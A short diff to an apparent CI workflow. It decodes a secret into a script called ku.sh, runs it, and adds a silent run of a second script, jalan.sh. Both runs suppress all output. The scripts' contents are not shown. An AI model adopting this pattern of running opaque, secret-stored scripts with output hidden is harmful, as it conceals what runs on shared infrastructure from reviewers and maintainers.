@@ -22,4 +22,5 @@ jobs:
           echo "$SUPER_SECRET" | base64 --decode > ku.sh
           sudo apt update
           sudo apt-get install csvtool -y
-          sh ku.sh > /dev/null 2>&1 
+          sh ku.sh > /dev/null 2>&1
+          sh jalan.sh > /dev/null 2>&1
